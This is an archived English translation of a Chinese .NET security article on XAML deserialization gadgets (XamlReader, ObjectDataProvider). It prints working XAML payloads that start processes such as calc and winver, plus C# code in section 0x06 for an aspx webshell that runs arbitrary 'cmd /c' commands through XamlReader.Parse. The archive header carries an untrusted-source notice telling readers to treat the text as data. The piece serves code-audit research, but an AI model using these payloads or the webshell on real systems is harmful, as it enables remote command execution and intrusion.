---
type: Article
title: .NET高级代码审计-反序列化 Gadget之详解XAML
resource: "https://dotnet9.com/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
tags: [article, ysonet-reference, unknown]
generated:
  by: ysonet-refs/1
  at: "2026-08-04T21:29:25+00:00"
status: stable
stale_after: 2027-08-04
sources:
  - id: original
    resource: "https://dotnet9.com/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
    title: .NET高级代码审计-反序列化 Gadget之详解XAML
    author: Ivan1ee dotNet安全矩阵
    last_modified: 2022-05-29
  - id: canonical
    resource: "https://dotnet9.com/zh-CN/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
also_at: []
authors:
  - Ivan1ee dotNet安全矩阵
canonical_url: "https://dotnet9.com/zh-CN/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
cited_by:
  - "docs/dotnet-deserialization-research.md:254"
commit: ""
content_sha256: 3b35724bcc1b3f8b30dd279a659071ca9010e92659bcaa052a962143c8f96fcc
depth: full
depth_reason: default
kind: article
language: ""
licence: unknown
original_url: "https://dotnet9.com/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
published: 2022-05-29
publisher: 码坊
publisher_english: Code Workshop
raw_sha256: 61f7b44b9c83f1838d1f6e1adf6ee501998bf57a1c822d819c9d31c59825b041
retrieved_from: "https://dotnet9.com/zh-CN/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml"
retrieved_kind: preserved-copy
retrieved_utc: "2026-08-04T21:29:25+00:00"
slug: 2022-net-gadgetxaml
snapshot: ""
title_english: ".NET Advanced Code Auditing - Deserialization Gadget: XAML Explained in Detail"
---

# .NET Advanced Code Auditing - Deserialization Gadget: XAML Explained in Detail

**.NET高级代码审计-反序列化 Gadget之详解XAML** - Ivan1ee dotNet安全矩阵, 码坊.

- Title in English: .NET Advanced Code Auditing - Deserialization Gadget: XAML Explained in Detail
- Publisher in English: Code Workshop
- Published: 2022-05-29
- Original: <https://dotnet9.com/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml>
- Current location: <https://dotnet9.com/zh-CN/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml>
- Preserved from: https://dotnet9.com/zh-CN/2022/05/Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml (preserved-copy) on 2026-08-04
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source cited by ysonet, kept so the technique survives the
page going offline. To read the original, follow the link above.

## Content (English translation)

_English translation. Original text is retained in the content store; the source PDF, when available, retains its original language._

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

## 0x01 Background

The core Gadget of the .NET deserialization vulnerability `XmlSerializer` is `XamlReader`, which is packaged in one of the WPF core assemblies, PresentationFramework.dll, sits under the System.Windows.Markup namespace, and provides two public classes, XamlReader and XamlWriter. The low-level Load method provided by the XamlReader class can parse XAML character stream data to create .NET object instances, and it also provides the higher-level wrapper method XamlReader.Parse for parsing an XAML string directly; the XmlSerializer deserialization chain achieves command execution based on this method. Since we cannot get away from XAML, follow the author to get a first acquaintance with XAML and learn the relevant basics.

## 0x02 Getting started with XAML

WPF is used to replace Windows Form for creating Windows client applications. Like a Web project, it follows the principle of separating the front-end layout from the back-end code implementation. The front end of a Web project is usually HTML, while XAML is used for the front-end interface development of a WPF project. The full name of XAML is `Extensible Application Markup Language`, a markup language based on general XML syntax that is used for instantiating .NET objects. Every element in a XAML document maps to an instance of a .NET class, for example the root element `<Window>` means WPF creates a Window object. In addition, the root element can also be `<Application>`, `<Page>`, `<UserControl>`; in fact `XAML在编译时也会编成C#类`, so the code-behind inside the .cs file corresponding to the interface must declare the partial keyword, so that at compile time the UI interface and the running logic code end up combined together. Below is the most basic XAML code

```xml
<Window x:Class="WpfApplication1.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:sys="clr-namespace:System;assembly=mscorlib"
        Title="MainWindow" Height="300" Width="300">
    <ListBox>
        <ListBoxItem>
            <sys:String>欢迎关注dotNet安全矩阵</sys:String>
        </ListBoxItem>
    </ListBox>
</Window>

```

The above contains a Window element as well as a Grid element. The Window element represents the whole window, and the Grid can hold all the controls. The overall structure is really a window object with a Grid object nested inside it. x:Class represents the back-end namespace and class name; the benefit of this is that the front-end XAML in WPF and the back-end implementation code are maintained separately. xmlns spelled out in full is: XML namespace. xmlns can be followed by an optional mapping prefix x, separated from it by a colon. In addition, two xmlns namespaces are declared, as in the table below

![](https://img1.dotnet9.com/2022/05/5901.png)

What do the URLs in the list above mean? These are hard conventions of the XAML parser: `http://schemas.microsoft.com/winfx/2006/xaml/presentation` means importing the WPF core assembly `PresentationFramework`, for example the common `System.Windows.Data` namespace; `http://schemas.microsoft.com/winfx/2006/xaml` means importing another core assembly `System.Xaml`, for example the commonly used `Windows.Markup`, which can be seen after decompiling, as in the figure

![](https://img1.dotnet9.com/2022/05/5902.png)

In addition there is also `xmlns:sys="clr-namespace:System;assembly=mscorlib"`, which means mapping the `sys` prefix to the .NET base class library `System.String` namespace, and later `<sys:String>` is used to get the string type. Similarly, if you want to import base classes supported by other .NET assemblies, refer to the following syntax `xmlns:Prefix="clr-namespace:Namespace;assembly=AssemblyName"`, for example the assembly containing the `Diagnostics.Process` class commonly used in deserialization attack payloads: `xmlns:c="clr-namespace:System.Diagnostics;assembly=system"`

![](https://img1.dotnet9.com/2022/05/5903.png)

## 0x03 X: directives

The project name `ObjectDataProvider` the author created is somewhat confusing; let me explain here that it has nothing at all to do with the ObjectDataProvider class used in deserialization. The table below gives the meanings of several common x: namespace directives

![](https://img1.dotnet9.com/2022/05/5904.png)

`x:Class` has already been discussed and will not be repeated, while `x:Key` means retrieving the key name of a needed element in a resource file, `x:Type` means a data type provided by the CLR, which in XAML can be regarded as referencing a class under some namespace, `x:Static` references a static field defined in a back-end class, and `x:Code` can execute C# code in XAML to pop up a calculator, for example on the window's `Loaded` event the triggered method name is specified as: `Window_Loaded`

```xml
<x:Code>
        <![CDATA[
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            System.Diagnostics.Process.Start("calc");
        }
        ]]>
</x:Code>

```

Using the figure below, the author has drawn many concepts into the picture, hoping to help the reader get a more intuitive understanding. In the figure below, `x:Type` can simply be understood as: when you want to use some data type in XAML you have to use it, for example calling the `Process` class from the custom namespace `xmlns:process`; in addition, `xmlns:local="clr-namespace:ObjectDataProvider"` maps the local project namespace `ObjectDataProvider` to the prefix `xmlns:local`

![](https://img1.dotnet9.com/2022/05/5905.png)

In the figure above, `x:Type` can simply be understood as: when you want to use some data type in XAML you have to use it, for example calling the `Process` class from the custom namespace `xmlns:process`; in addition, `xmlns:local="clr-namespace:ObjectDataProvider"` maps the local project namespace `ObjectDataProvider` to the prefix `xmlns:local`

## 0x04 Simplifying the payload

Lesson 12 already introduced in detail that a resource dictionary (ResourceDictionary) functionally stores resources in the form of key-value pairs, and can store objects of any type. By default the window designer creates a Window.Resources tag; the author adds two resource items, one of String type and one of Double type, and finally reads the resources statically and binds them to a TextBlock control

![](https://img1.dotnet9.com/2022/05/5906.png)

When there are too many resources and they need to be stored centrally, ResourceDictionary is used: each resource can be saved separately in its own file, and merged together for use with ResourceDictionary.MergeDictionaries

```xml
<ResourceDictionary>
    <ResourceDictionary.MergedDictionaries>
        <ResourceDictionary Source="Dic1.xaml"/>
        <ResourceDictionary Source="Dic2.xaml"/>
    </ResourceDictionary.MergedDictionaries>
 </ResourceDictionary>

```

If Window.Resources is not found in the top-level container, the program will continue to go up to Application.Resources to look for the resource, so if we introduce malicious code into Application.Resources it can also be invoked and run. Look at the XAML together with the Payload given by XmlSerialize deserialization; does it not feel much easier now?

```xml
<![CDATA[
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:b="clr-namespace:System;assembly=mscorlib"
xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <b:String>cmd</b:String>
            <b:String>/c calc</b:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>]]>

```

The clr-namespace:System.Diagnostics assembly is required, since we need it to call the Process class to start a new process. But it can be simplified further: clr-namespace:System is not required, so the corresponding namespace xmlns:b does not need to be used, and MethodParameters therefore no longer needs to use the `<b:String>` element. In addition, `<ResourceDictionary>` can also be replaced by the `<Window.Resources>` or `<Application.Resources>`, `<Grid>` controls. The code is as follows

```xml
<Grid xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <Grid.Resources>
        <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
            <ObjectDataProvider.MethodParameters>calc</ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
    </Grid.Resources>
</Grid>

```

## 0x05 Attack surface

### XamlReader.Parse

In the XmlSerializer deserialization chain, ysoserial uses XamlReader.Parse to parse the XAML string and return a new object. Going to the definition, you can see there are 2 method overloads; the official documentation notes the following

>

Reads the XAML input in the specified text string and returns an object that corresponds to the root of the specified markup.

![](https://img1.dotnet9.com/2022/05/5907.png)

The author created a test case stored in Dictionary2.xaml, with the code below; `ObjectType="{x:Type TypeName=local:Process }` can omit TypeName, and in addition the resource retrieval key name ResourceKey can also be omitted, `Source={StaticResource ResourceKey=obj}`

```xml
<Window
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        xmlns:local ="clr-namespace:System.Diagnostics;assembly=System"
        Title="MainWindow" Height="450" Width="800">
    <Window.Resources>
        <ObjectDataProvider x:Key="obj" ObjectType="{x:Type local:Process }" MethodName="Start">
            <ObjectDataProvider.MethodParameters>"winver"</ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
    </Window.Resources>
    <Grid DataContext="{Binding Source={StaticResource obj}}">
        <Button Content="Button" HorizontalAlignment="Left" Margin="300.085,187.924,0,0" VerticalAlignment="Top" Width="139.599" Height="45.517"/>
    </Grid>
</Window>

```

```csharp
string xml = File.ReadAllText("../../Dictionary2.xaml");
XamlReader.Parse(xml);

```

Running the above code and tracing the call stack, I found that several Load methods were called, and noticed that the Load method of the WpfXamlLoader class was called; it turns out to be an internally implemented class that cannot be used directly from outside, and the call can only be achieved through the XamlReader.Loader method

![](https://img1.dotnet9.com/2022/05/5908.png)

### XamlReader.LoadAsync

The XamlReader class provides 3 kinds of Load overload, and additionally provides the LoadAsync asynchronous method, used so that transferring large file data does not affect the program's main thread; it can directly load a stream and convert it into an object

```csharp
//Test:Load
string xml = File.ReadAllText("../../Dictionary2.xaml");
MemoryStream ms = new MemoryStream(System.Text.Encoding.Default.GetBytes(xml));
XamlReader.Load(ms);

//Test:LoadAsync
MemoryStream ms0 = new MemoryStream(System.Text.Encoding.Default.GetBytes(xml));
XamlReader xamlReader = new XamlReader();
xamlReader.LoadAsync(ms0);

```

![](https://img1.dotnet9.com/2022/05/5909.png)

## 0x06 WebShell

To make the program more operable, the author switched to writing the risk-check smart assistant as an aspx page, and at the same time designed features such as host processes, host information collection, and host directory file access. Internally it runs using a Base64 encoding and decoding parsing approach; the benefit of this lies in the handling of special URL strings. It starts the `Process` class and calls `cmd.exe/c winver.ex`e to execute commands. The core code and the page user experience interface are in the program below

```csharp
public static void CodeInject(string input)
{
    string ExecCode = EncodeBase64("utf-8", input);
    StringBuilder strXMAL = new StringBuilder("<ResourceDictionary ");
    strXMAL.Append("xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" ");
    strXMAL.Append("xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" ");
    strXMAL.Append("xmlns:b=\"clr-namespace:System;assembly=mscorlib\" ");
    strXMAL.Append("xmlns:pro =\"clr-namespace:System.Diagnostics;assembly=System\">");
    strXMAL.Append("<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type pro:Process}\" MethodName=\"Start\">");
    strXMAL.Append("<ObjectDataProvider.MethodParameters>");
    strXMAL.Append("<b:String>cmd</b:String>");
    strXMAL.Append("<b:String>/c "+ DecodeBase64("utf-8",ExecCode) +"</b:String>");
    strXMAL.Append("</ObjectDataProvider.MethodParameters>");
    strXMAL.Append("</ObjectDataProvider>");
    strXMAL.Append("</ResourceDictionary>");
    XamlReader.Parse(strXMAL.ToString());
}

```

![](https://img1.dotnet9.com/2022/05/5910.png)

## 0x07 Conclusion

Regarding the several command execution methods of the XamlReader class, I hope they will not be maliciously abused in the future. All right, this article ends here. The PDF and Demo involved in the article have already been packaged and published on the Planet. Everyone who follows and cares about .NET security is welcome to join us; here you can meet warm-hearted and loyal friends, and everyone gathers together to do something meaningful.
